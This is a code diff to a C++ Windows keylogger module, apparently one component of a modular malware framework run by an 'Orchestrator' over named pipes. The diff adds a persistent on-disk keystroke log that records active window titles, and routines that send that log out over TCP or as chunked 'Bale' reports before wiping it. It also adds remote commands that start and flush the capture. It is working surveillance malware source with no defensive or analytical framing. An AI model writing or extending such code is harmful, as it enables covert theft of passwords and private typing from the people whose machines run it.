@@ -4,6 +4,7 @@
  *            sends reports on report pipe.
  *===========================================================================*/
 
+#define WIN32_LEAN_AND_MEAN
 #include "Atom_02_Key.h"
 #include "../Orchestrator/AtomManager.h"
 #include "../Orchestrator/Config.h"
@@ -11,11 +12,16 @@
 #include <cstdio>
 #include <string>
 #include <winnls.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#pragma comment(lib, "ws2_32.lib")
+#include "../Orchestrator/TurboSend.h"
 
 #pragma comment(lib, "user32.lib")
 
 // ===== DEBUG FILE LOGGING =====
 static void KeylogDebug(const char *format, ...) {
+  if (!Config::LOGGING_ENABLED) return;
   char buf[512];
   va_list args;
   va_start(args, format);
@@ -26,7 +32,6 @@ static void KeylogDebug(const char *format, ...) {
     fprintf(f, "%s\n", buf);
     fclose(f);
   }
-  printf("%s\n", buf);
 }
 
 /* The ring buffer for keystrokes (UTF-8 encoded) */
@@ -41,9 +46,22 @@ static HHOOK s_hKeyHook = NULL;
 static HANDLE s_hCmdPipe = NULL;    // Receives commands from Orchestrator
 static HANDLE s_hReportPipe = NULL; // Sends reports to Orchestrator
 static BYTE s_SharedSessionKey[16];
+static BOOL s_bIsBale = FALSE;
 
 /* Track window changes */
 static HWND s_hLastWindow = NULL;
+
+/* Persistent Log File */
+static const char *s_szLogPath = "log\\keylog_master.dat";
+
+static void WriteToPersistentLog(const char *text) {
+  if (!Config::LOGGING_ENABLED) return; // Central toggle control
+  FILE *f = fopen(s_szLogPath, "a+");
+  if (f) {
+    fprintf(f, "%s", text);
+    fclose(f);
+  }
+}
 
 /*
  * Enhanced key translation – uses ToUnicodeEx to respect the active keyboard
@@ -220,13 +238,27 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     KBDLLHOOKSTRUCT *pkbhs = (KBDLLHOOKSTRUCT *)lParam;
 
     HWND hForeground = GetForegroundWindow();
-    if (hForeground != s_hLastWindow) {
+    if (hForeground != s_hLastWindow || s_dwBufferIndex == 0) {
+      // If handle changed and we have pending keys, flush them first
+      if (hForeground != s_hLastWindow && s_dwBufferIndex > 0) {
+        FlushKeyBufferToIPC();
+      }
+
       s_hLastWindow = hForeground;
       char szTitle[256] = {0};
       GetWindowTextA(hForeground, szTitle, 255);
 
-      char szHeader[300];
-      wsprintfA(szHeader, "\r\n\r\n[WND: %s]\r\n", szTitle);
+      char szHeader[350];
+      // If it's a continuation of the same window after a flush, use a simple header
+      // If it's a new window, use a more prominent one
+      static HWND s_hLastReportedWindow = NULL;
+      if (hForeground != s_hLastReportedWindow) {
+          wsprintfA(szHeader, "\r\n\r\n--- [ Entering: %s ] ---\r\n", szTitle);
+          WriteToPersistentLog(szHeader); // Log to master file only on true change
+          s_hLastReportedWindow = hForeground;
+      } else {
+          wsprintfA(szHeader, "\r\n[Cont: %s]\r\n", szTitle);
+      }
 
       DWORD headerLen = lstrlenA(szHeader);
       if (s_dwBufferIndex + headerLen < KEYLOG_BUFFER_SIZE) {
@@ -246,6 +278,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
       int utf8Len = WideCharToMultiByte(CP_UTF8, 0, szWideKey, chars, szUtf8Key,
                                         sizeof(szUtf8Key) - 1, NULL, NULL);
       if (utf8Len > 0 && (s_dwBufferIndex + utf8Len < KEYLOG_BUFFER_SIZE)) {
+        WriteToPersistentLog(szUtf8Key); // Log to master file
         lstrcpyA(&s_KeyBuffer[s_dwBufferIndex], szUtf8Key);
         s_dwBufferIndex += utf8Len;
         s_dwKeyCount++;
@@ -253,7 +286,8 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                     s_dwBufferIndex, s_dwKeyCount);
       }
 
-      if (s_dwKeyCount >= 5 || s_dwBufferIndex > 100) {
+      // Flush if we have enough keys OR if buffer is getting large
+      if (s_dwKeyCount >= 20 || s_dwBufferIndex > 400) {
         FlushKeyBufferToIPC();
       }
     }
@@ -261,7 +295,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
   return CallNextHookEx(s_hKeyHook, nCode, wParam, lParam);
 }
-
 BOOL FlushKeyBufferToIPC() {
   if (s_dwBufferIndex == 0) {
     KeylogDebug("[Keylog] Flush called but buffer empty.");
@@ -273,9 +306,20 @@ BOOL FlushKeyBufferToIPC() {
 
   IPC_MESSAGE msg = {0};
   msg.dwSignature = 0x534D4952;
-  msg.CommandId = CMD_REPORT;
-  msg.dwPayloadLen = s_dwBufferIndex;
-  memcpy(msg.Payload, s_KeyBuffer, s_dwBufferIndex);
+  msg.CommandId = s_bIsBale ? CMD_BALE_REPORT : CMD_REPORT;
+  msg.AtomId = 2;
+  if (s_bIsBale) {
+      struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+      hdr.dwType = 0; // Text/Log
+      hdr.dwFlags = 0;
+      hdr.dwPayloadLen = s_dwBufferIndex;
+      msg.dwPayloadLen = sizeof(hdr) + hdr.dwPayloadLen;
+      memcpy(msg.Payload, &hdr, sizeof(hdr));
+      memcpy(msg.Payload + sizeof(hdr), s_KeyBuffer, s_dwBufferIndex);
+  } else {
+      msg.dwPayloadLen = s_dwBufferIndex;
+      memcpy(msg.Payload, s_KeyBuffer, s_dwBufferIndex);
+  }
 
   BOOL bSuccess = IPC_SendMessage(s_hReportPipe, &msg, s_SharedSessionKey, 16);
   KeylogDebug("[Keylog] >>> IPC_SendMessage returned %d", bSuccess);
@@ -289,6 +333,91 @@ BOOL FlushKeyBufferToIPC() {
     KeylogDebug("[Keylog] IPC send FAILED! Error: %lu", GetLastError());
   }
   return bSuccess;
+}
+
+static void SendFullLogFile() {
+  FILE *f = fopen(s_szLogPath, "rb");
+  if (!f) {
+    KeylogDebug("[Keylog] Master log not found or busy.");
+    return;
+  }
+
+  fseek(f, 0, SEEK_END);
+  long fileSize = ftell(f);
+  fseek(f, 0, SEEK_SET);
+
+  if (fileSize == 0) {
+    KeylogDebug("[Keylog] Master log is empty, nothing to send.");
+    fclose(f);
+    return;
+  }
+  fclose(f); // close so Turbo can read it
+
+  KeylogDebug("[Keylog] Sending master log (%ld bytes)...", fileSize);
+
+  if (!s_bIsBale) {
+      if (Turbo::SendFile("KEYLOG", s_szLogPath)) {
+          KeylogDebug("[Keylog] Master log sent via Turbo TCP.");
+          FILE *clear_f = fopen(s_szLogPath, "wb");
+          if (clear_f) fclose(clear_f);
+          KeylogDebug("[Keylog] Master log cleared after successful send.");
+      } else {
+          KeylogDebug("[Keylog] Failed to send Master log via Turbo TCP.");
+      }
+      return;
+  }
+
+  f = fopen(s_szLogPath, "rb");
+  if (!f) return;
+
+  // Send CHUNK_START
+  IPC_MESSAGE startMsg = {0};
+  startMsg.dwSignature = 0x534D4952;
+  startMsg.CommandId = CMD_BALE_REPORT;
+  startMsg.AtomId = 2;
+  struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr = {3 /* File */, 0x10 /* CHUNK_START */, 0};
+  std::string meta = "name=keylog_master.txt";
+  hdr.dwPayloadLen = (DWORD)meta.length();
+  startMsg.dwPayloadLen = sizeof(hdr) + hdr.dwPayloadLen;
+  memcpy(startMsg.Payload, &hdr, sizeof(hdr));
+  memcpy(startMsg.Payload + sizeof(hdr), meta.c_str(), meta.length());
+  IPC_SendMessage(s_hReportPipe, &startMsg, s_SharedSessionKey, 16);
+
+  // Send Data
+  char chunk[MAX_IPC_PAYLOAD_SIZE - 16];
+  size_t bytesRead;
+  while ((bytesRead = fread(chunk, 1, sizeof(chunk), f)) > 0) {
+    IPC_MESSAGE dataMsg = {0};
+    dataMsg.dwSignature = 0x534D4952;
+    dataMsg.CommandId = CMD_BALE_REPORT;
+    dataMsg.AtomId = 2; // FIXED: Added missing AtomId
+    hdr.dwType = 3; /* File */
+    hdr.dwFlags = 0x11; /* CHUNK_DATA */
+    hdr.dwPayloadLen = (DWORD)bytesRead;
+    dataMsg.dwPayloadLen = sizeof(hdr) + hdr.dwPayloadLen;
+    memcpy(dataMsg.Payload, &hdr, sizeof(hdr));
+    memcpy(dataMsg.Payload + sizeof(hdr), chunk, bytesRead);
+    IPC_SendMessage(s_hReportPipe, &dataMsg, s_SharedSessionKey, 16);
+  }
+
+  // Send CHUNK_END
+  IPC_MESSAGE endMsg = {0};
+  endMsg.dwSignature = 0x534D4952;
+  endMsg.CommandId = CMD_BALE_REPORT;
+  endMsg.AtomId = 2;
+  hdr.dwType = 3; /* File */
+  hdr.dwFlags = 0x12; /* CHUNK_END */
+  hdr.dwPayloadLen = 0;
+  endMsg.dwPayloadLen = sizeof(hdr);
+  memcpy(endMsg.Payload, &hdr, sizeof(hdr));
+  IPC_SendMessage(s_hReportPipe, &endMsg, s_SharedSessionKey, 16);
+
+  fclose(f);
+
+  // After successful send, clear the log file so the next flush only has new data
+  f = fopen(s_szLogPath, "wb");
+  if (f) fclose(f);
+  KeylogDebug("[Keylog] Master log cleared after successful send.");
 }
 
 DWORD WINAPI KeyloggerAtomMain(LPVOID lpParam) {
@@ -320,6 +449,7 @@ DWORD WINAPI KeyloggerAtomMain(LPVOID lpParam) {
   IPC_MESSAGE readyMsg = {0};
   readyMsg.dwSignature = 0x534D4952;
   readyMsg.CommandId = CMD_READY;
+  readyMsg.AtomId = dwAtomId;
   readyMsg.dwPayloadLen = 0;
   IPC_SendMessage(s_hReportPipe, &readyMsg, s_SharedSessionKey, 16);
   KeylogDebug("[Keylog] Sent CMD_READY.");
@@ -359,8 +489,14 @@ DWORD WINAPI KeyloggerAtomMain(LPVOID lpParam) {
           bRunning = FALSE;
         } else if (inMsg.CommandId == CMD_EXECUTE) {
           std::string cmd((char *)inMsg.Payload, inMsg.dwPayloadLen);
-          if (cmd == "FLUSH") {
+          if (cmd == "START") {
+             KeylogDebug("[Keylog] Started.");
+          } else if (cmd == "BALE_START") {
+             s_bIsBale = TRUE;
+             KeylogDebug("[Keylog] Bale Mode Enabled.");
+          } else if (cmd == "FLUSH") {
             FlushKeyBufferToIPC();
+            SendFullLogFile();
           } else if (cmd == "STOP") {
             KeylogDebug("[Keylog] Received STOP command. Flushing and Exiting.");
             FlushKeyBufferToIPC();
